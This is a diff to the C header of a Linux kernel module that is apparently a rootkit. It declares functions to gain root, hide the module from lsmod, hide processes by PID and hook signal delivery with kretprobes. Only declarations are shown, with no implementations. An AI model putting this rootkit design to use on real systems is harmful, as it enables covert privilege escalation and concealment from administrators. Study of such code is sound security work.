@@ -5,6 +5,7 @@
 #include <linux/kprobes.h>
 #include <linux/cred.h>
 #include <linux/sched.h>
+#include <linux/ptrace.h>
 
 // Features exécutées par les hooks
 int become_root(void);
@@ -19,13 +20,23 @@ int ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs);
 
 // Déclaration externe des structs de probes pour utilisation dans les fichiers C
 extern struct kretprobe rootkit_kretprobe;
-extern struct kprobe sig_kp;
+
+// Sutructure d'un processus à partir de son PID
+struct task_struct *find_task(pid_t pid);
+
+// Dissimule un process via son PID
+int hide_process(pid_t pid);
 
 // Fonctions de dissimulation du module
 void hide_from_lsmod(void);
 
 // Probe sur l'envoi de signal aux processus
-int handle_signal_send(struct kprobe *kp, struct pt_regs *regs);
+extern struct kretprobe sig_kp;
+int entry_signal(struct kretprobe_instance *ri, struct pt_regs *regs); 
+int ret_signal(struct kretprobe_instance *ri, struct pt_regs *regs);
+
+// Fonctions d'aide
+void print_registers(struct pt_regs *regs);
 
 #endif 
 
